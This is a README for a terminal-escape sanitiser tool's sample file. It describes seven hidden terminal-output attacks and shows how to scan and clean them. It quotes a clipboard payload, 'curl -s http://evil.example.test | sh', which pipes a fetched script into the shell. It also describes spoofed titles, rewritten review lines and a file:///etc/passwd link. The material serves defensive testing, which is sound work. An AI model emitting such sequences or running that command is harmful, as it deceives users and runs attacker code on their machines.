# seqsafe examples

## `poisoned.log`

A small corpus of realistic terminal-output attacks packed into seven lines
of an innocent-looking "release notes" file. It contains, in order:

1. Legitimate SGR styling (`[verified]` in bold green) — must survive.
2. An **OSC 52 clipboard write** hidden after an install command; the base64
   payload decodes to `curl -s http://evil.example.test | sh`, which would be
   waiting in your clipboard the next time you paste.
3. An **OSC 0 title change** ("security scan passed") that outlives the output.
4. A **cursor-up + erase-line** combo that rewrites the "reviewed by
   maintainer" line after you have read it.
5. A safe `https:` hyperlink next to an unsafe `file:///etc/passwd` one.
6. A **charset designation** (`ESC ( 0`) that turns following text into
   line-drawing glyphs.
7. A **raw 8-bit C1** query and erase (`0x9B`) that ESC-only filters miss.

Try it (from the repository root, after `cargo build`):

```bash
# What is hiding in there? (exit code 1: critical finding)
target/debug/seqsafe scan examples/poisoned.log

# Same, with a rationale per finding
target/debug/seqsafe explain examples/poisoned.log

# Sanitize it: styling and the safe link survive, the attacks do not
target/debug/seqsafe clean examples/poisoned.log | less -R

# Show exactly what was removed, in place
target/debug/seqsafe clean --mark examples/poisoned.log
```

Never `cat` this file on a terminal you care about — that is the point.
